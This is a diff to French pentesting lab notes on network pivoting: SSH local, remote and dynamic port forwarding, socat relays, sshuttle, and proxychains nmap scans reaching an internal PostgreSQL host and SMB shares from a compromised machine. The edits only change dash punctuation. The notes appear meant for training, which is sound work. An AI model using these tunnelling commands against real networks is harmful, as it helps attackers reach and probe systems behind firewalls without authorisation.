@@ -14,7 +14,7 @@ ssh -f -N -L [LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT user@ssh_server
 | Flag | Description |
 |------|-------------|
 | `-f` | Passe SSH en arrière-plan juste avant l'exécution (libère le terminal) |
-| `-N` | Ne pas ouvrir de shell distant — juste maintenir le tunnel |
+| `-N` | Ne pas ouvrir de shell distant -  juste maintenir le tunnel |
 | `-L` | Définit la règle de port forwarding local `[LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT` |
 | `-v` | Mode verbose pour débugger la connexion |
 **Vérifier que le port écoute sur la machine pivot**
@@ -99,11 +99,11 @@ sudo proxychains nmap -sT -n -Pn --top-ports=20 <IP_CIBLE>
 
 > Nmap : utiliser `-sT` (TCP connect), jamais `-sS` (raw packets incompatibles SOCKS). Passer `-n -Pn` pour éviter les résolutions DNS/ping qui ne passent pas via SOCKS.
 >
-> Le scan est lent par défaut — réduire `tcp_read_time_out` et `tcp_connect_time_out` dans `/etc/proxychains4.conf` pour accélérer.
+> Le scan est lent par défaut -  réduire `tcp_read_time_out` et `tcp_connect_time_out` dans `/etc/proxychains4.conf` pour accélérer.
 
 ## Remote Port Forwarding
 
-Le port d'écoute est ouvert côté **serveur SSH** (Kali), pas côté client. Le client (machine compromise) initie la connexion sortante — contourne ainsi les firewalls qui bloquent l'inbound mais autorisent l'outbound SSH.
+Le port d'écoute est ouvert côté **serveur SSH** (Kali), pas côté client. Le client (machine compromise) initie la connexion sortante -  contourne ainsi les firewalls qui bloquent l'inbound mais autorisent l'outbound SSH.
 
 > Analogue à un reverse shell, mais pour le port forwarding.
 
@@ -131,7 +131,7 @@ sudo ss -ntplu
 ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@<IP_KALI>
 ```
 
-Le port 2345 s'ouvre sur le **loopback de Kali** — le trafic envoyé là est routé par CONFLUENCE01 vers PGDATABASE01.
+Le port 2345 s'ouvre sur le **loopback de Kali** -  le trafic envoyé là est routé par CONFLUENCE01 vers PGDATABASE01.
 
 **Vérifier côté Kali que le port est bien ouvert**
 
@@ -149,13 +149,13 @@ psql -h 127.0.0.1 -p 2345 -U postgres
 
 Combine les avantages du remote forwarding (connexion sortante depuis la machine compromise) et du dynamic forwarding (proxy SOCKS multi-cibles). Le port SOCKS s'ouvre sur **Kali**, le trafic est forwardé par la machine compromise.
 
-> Disponible depuis OpenSSH 7.6 (octobre 2017) — uniquement le client doit être ≥ 7.6, pas le serveur.
+> Disponible depuis OpenSSH 7.6 (octobre 2017) -  uniquement le client doit être ≥ 7.6, pas le serveur.
 
 ```bash
 ssh -N -R REMOTE_PORT user@kali
 ```
 
-> Seul le port est spécifié (pas de destination) — le proxy SOCKS s'ouvre sur le loopback de Kali.
+> Seul le port est spécifié (pas de destination) -  le proxy SOCKS s'ouvre sur le loopback de Kali.
 
 ![](assets/Pasted%20image%2020260509180938.png)
 ### Ouvrir le tunnel depuis la machine compromise
@@ -210,7 +210,7 @@ psql -h 127.0.0.1 -p 1234 -U postgres
 
 ## sshuttle
 
-Transforme une connexion SSH en VPN léger : routes locales créées automatiquement sur Kali pour que tout le trafic vers les sous-réseaux cibles passe de façon transparente par le tunnel — pas besoin de Proxychains.
+Transforme une connexion SSH en VPN léger : routes locales créées automatiquement sur Kali pour que tout le trafic vers les sous-réseaux cibles passe de façon transparente par le tunnel -  pas besoin de Proxychains.
 
 **Prérequis :** root sur le client SSH (Kali) + Python3 sur le serveur SSH cible.
 
@@ -219,7 +219,7 @@ Transforme une connexion SSH en VPN léger : routes locales créées automatique
 Si le serveur SSH interne n'est pas directement accessible, créer d'abord un pivot avec socat sur la machine compromise :
 
 ```bash
-# Sur CONFLUENCE01 — forward le port 2222 vers SSH de PGDATABASE01
+# Sur CONFLUENCE01 -  forward le port 2222 vers SSH de PGDATABASE01
 socat TCP-LISTEN:2222,fork TCP:<IP_INTERNE>:22
 ```
 
@@ -237,7 +237,7 @@ sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
 
 ### Utiliser le tunnel
 
-Une fois connecté, toutes les commandes atteignent directement les hôtes des sous-réseaux cibles — sans proxychains ni port forwarding explicite :
+Une fois connecté, toutes les commandes atteignent directement les hôtes des sous-réseaux cibles -  sans proxychains ni port forwarding explicite :
 
 ```bash
 smbclient -L //172.16.50.217/ -U hr_admin --password=<password>
